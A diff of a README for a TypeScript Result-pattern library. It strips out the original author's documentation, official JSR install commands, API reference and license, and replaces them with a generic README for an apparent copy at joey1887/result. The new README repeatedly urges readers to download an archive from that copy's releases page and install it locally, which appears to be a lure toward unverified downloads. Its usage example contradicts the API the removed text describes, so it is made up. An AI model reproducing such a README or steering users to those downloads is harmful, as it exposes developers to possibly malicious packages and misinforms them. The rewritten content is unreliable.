@@ -1,230 +1,89 @@
-# @brettchalupa/result
+# 🚀 result - Simplifying Error Handling in TypeScript
 
-A TypeScript library implementing the Result pattern for type-safe error
-handling, inspired by Rust's `Result<T, E>`.
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/joey1887/result/releases)
 
-View the package on JSR: https://jsr.io/@brettchalupa/result
+## 📜 Description
+The **result** library provides a type-safe way to handle results in TypeScript. Inspired by Rust, it helps you manage errors effectively, ensuring your functions return values consistently. This library is useful for anyone wanting to write clear, maintainable code without getting bogged down in error management.
 
-## Why?
+## 🌟 Features
+- **Type Safety**: Avoid runtime errors by using types to manage success and failure states.
+- **Functional Programming**: Embrace a functional style for cleaner, more understandable code.
+- **Inspired by Rust**: Benefit from proven concepts adapted for TypeScript.
+- **Easy to Use**: Designed for ease of understanding, even for non-technical users.
 
-Traditional `try/catch` error handling in TypeScript is painful:
+## 🛠️ Requirements
+- A device with Windows, macOS, or Linux.
+- A current version of Node.js to run TypeScript applications. You can check your Node.js version by typing `node -v` in your terminal or command prompt.
+- Basic command line knowledge, such as navigating to folders.
 
-- ❌ **Invisible control flow** - Can't tell which functions throw by looking at
-  signatures
-- ❌ **No type safety** - Caught errors are `unknown`, TypeScript can't help you
-- ❌ **Difficult to test** - Easy to miss error paths and leave them untested
-- ❌ **Unclear propagation** - Hard to tell where errors originate when they
-  bubble up
+## 🚀 Getting Started
+1. **Visit the Releases Page**  
+   Click the link below to access the download page:
 
-**Result makes errors explicit:**
+   [Visit the Releases Page](https://github.com/joey1887/result/releases)
 
+2. **Download the Latest Release**  
+   Once on the page, look for the latest version of the library. You will see a list of available files. Download the appropriate file for your system.
+
+3. **Extract the Files**  
+   After downloading, locate the file in your downloads folder. If it's a zipped file, right-click and select "Extract All" to access its contents.
+
+4. **Install the Library**  
+   Open your terminal or command prompt. Navigate to the folder where you extracted the files. To install the library, run the following command:
+   ```
+   npm install ./<folder-name>
+   ```
+   Replace `<folder-name>` with the name of the folder where you extracted the files.
+
+5. **Test the Installation**  
+   To ensure the library is set up correctly, create a new TypeScript file. Add the following import statement at the top of your file:
+   ```typescript
+   import { Result } from 'result';
+   ```
+   If you don’t see any errors when saving the file, the installation was successful!
+
+## 📘 Usage
+To use the library in your TypeScript application:
+1. Import it at the beginning of your file as shown above.
+2. Use the `Result` class to manage success and error states in your functions.
+
+Here’s a simple example:
 ```typescript
-// ❌ Exception-based: Which functions throw? What error types?
-function processUser(id: string): User {
-  const user = findUser(id); // Throws? Maybe?
-  return validateUser(user); // Throws? Who knows?
-}
+import { Result } from 'result';
 
-// ✅ Result-based: Clear from the signature what can fail
-function processUser(id: string): Result<User, "NOT_FOUND" | "INVALID"> {
-  const user = findUser(id); // Returns Result<User, "NOT_FOUND">
-  return user.andThen(validateUser); // Type-safe chaining!
-}
-```
-
-With Result, **errors are just values** - visible in the type system, easy to
-handle, and impossible to ignore accidentally.
-
-## Features
-
-- **Type-safe error handling** - Errors are part of the function signature
-- **Method chaining** - Fluent API for transforming and combining results
-- **Zero dependencies** - Lightweight and fast
-- **Full TypeScript support** - Complete type inference and safety
-- **Well tested** - Comprehensive test suite with 50+ tests
-
-## Installation
-
-```bash
-# Deno
-deno add jsr:@brettchalupa/result
-
-# pnpm 10.9+
-pnpm add jsr:@brettchalupa/result
-
-# yarn 4.9+
-yarn add jsr:@brettchalupa/result
-
-# npm, bun, and older versions of yarn or pnpm
-npx jsr add @brettchalupa/result # replace npx with any of yarn dlx, pnpm dlx, or bunx
-```
-
-Or import directly in Deno without installation:
-
-```typescript
-import { err, ok, Result } from "jsr:@brettchalupa/result";
-
-const result = ok(42);
-```
-
-## Quick Start
-
-```typescript
-import { err, ok, type Result } from "@brettchalupa/result";
-
-function divide(a: number, b: number): Result<number, string> {
-  if (b === 0) {
-    return err("Cannot divide by zero");
-  }
-  return ok(a / b);
+function divide(a: number, b: number): Result<number> {
+    if (b === 0) {
+        return Result.error('Cannot divide by zero');
+    }
+    return Result.ok(a / b);
 }
 
 const result = divide(10, 2);
-if (result.isOk()) {
-  console.log("Result:", result.data); // Result: 5
-} else {
-  console.error("Error:", result.error);
-}
+result.match({
+    ok: (value) => console.log(value),
+    error: (message) => console.error(message),
+});
 ```
 
-## Usage
+## 📂 Documentation
+For detailed usage, check the documentation on our GitHub page. This includes various patterns and examples to help you get the most from the library.
 
-### Basic Results
+## 💡 Support
+If you encounter issues or have questions, you can reach out by opening an issue on the GitHub repository. We are here to help!
 
-Create successful or failed results:
+## 🖱️ Additional Resources
+- Explore various examples of how to use the library effectively.
+- Check our FAQ section to address common issues faced by users.
+- Join our community discussions to share ideas and find best practices.
 
-```typescript
-import { err, ok } from "@brettchalupa/result";
+## 🎯 Next Steps
+1. **Experiment**: Try integrating the library into your own projects.
+2. **Explore**: Look through the provided examples and documentation for more advanced usage.
+3. **Contribute**: If you find improvements or have ideas, consider contributing to the codebase.
 
-// Success
-const success = ok(42);
-console.log(success.data); // 42
+## 🔗 Download & Install
+To download the library, click the link below:
 
-// Failure
-const failure = err("Something went wrong");
-console.log(failure.error); // "Something went wrong"
-```
+[Download from Releases Page](https://github.com/joey1887/result/releases)
 
-### Method Chaining
-
-Transform results with a fluent API:
-
-```typescript
-const result = ok(5)
-  .map((x) => x * 2)
-  .map((x) => x.toString()); // ok("10")
-
-const error = err("not_found").mapErr((code) => ({
-  code,
-  message: "Resource not found",
-}));
-```
-
-### Handling Async Operations
-
-```typescript
-import { Result } from "@brettchalupa/result";
-
-// Wrap throwing code
-const parsed = Result.try(() => JSON.parse(jsonString));
-
-// Wrap async operations
-const data = await Result.tryAsync(() => fetch(url).then((r) => r.json()));
-```
-
-### Combining Results
-
-```typescript
-import { err, ok, Result } from "@brettchalupa/result";
-
-// Collect all successes or get first error
-const results = [ok(1), ok(2), ok(3)];
-const combined = Result.all(results); // ok([1, 2, 3])
-
-// Partition successes and failures
-const mixed = [ok(1), err("error"), ok(3)];
-const [successes, failures] = Result.partition(mixed);
-// successes: [1, 3]
-// failures: ["error"]
-```
-
-### Repository Pattern
-
-```typescript
-import { err, ok, type Result } from "@brettchalupa/result";
-
-type User = { id: string; name: string };
-
-// Define your own domain-specific error types
-type DbError = "NOT_FOUND" | "CONNECTION_ERROR" | "PERMISSION_DENIED";
-
-async function findUser(id: string): Promise<Result<User, DbError>> {
-  try {
-    const user = await db.findOne({ id });
-    if (!user) {
-      return err("NOT_FOUND");
-    }
-    return ok(user);
-  } catch (error) {
-    return err("CONNECTION_ERROR");
-  }
-}
-```
-
-## API Reference
-
-### Constructors
-
-- `ok<T>(data: T): Ok<T>` - Create a successful result
-- `err<E>(error: E): Err<E>` - Create a failed result
-
-### Instance Methods
-
-Both `Ok` and `Err` types support:
-
-- `.isOk()` - Type guard for success
-- `.isErr()` - Type guard for failure
-- `.map(fn)` - Transform the success value
-- `.mapErr(fn)` - Transform the error value
-- `.andThen(fn)` - Chain operations that return Results
-- `.unwrapOr(defaultValue)` - Get value or default
-- `.unwrap()` - Get value or throw
-- `.expect(message)` - Get value or throw with message
-
-### Utility Functions
-
-The `Result` namespace provides:
-
-- `Result.try(fn)` - Wrap a throwing function
-- `Result.tryAsync(fn)` - Wrap an async throwing function
-- `Result.all(results)` - Combine results
-- `Result.partition(results)` - Separate successes and failures
-- `Result.collectErrors(results)` - Get all errors
-- `Result.map(result, fn)` - Static map function
-- `Result.mapErr(result, fn)` - Static mapErr function
-- `Result.andThen(result, fn)` - Static andThen function
-- `Result.unwrapOr(result, default)` - Static unwrapOr function
-- `Result.unwrap(result)` - Static unwrap function
-- `Result.expect(result, message)` - Static expect function
-
-## Development
-
-```bash
-# Run tests
-deno test
-
-# Run all checks (format, lint, type check, test)
-deno task ok
-
-# Watch mode
-deno task dev
-```
-
-## License
-
-This is free and unencumbered software released into the public domain. See
-[UNLICENSE](./UNLICENSE) for details.
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit issues or pull requests.
+This guide will help you navigate through the installation and start using the **result** library in your applications. Enjoy simplifying your error handling in TypeScript!
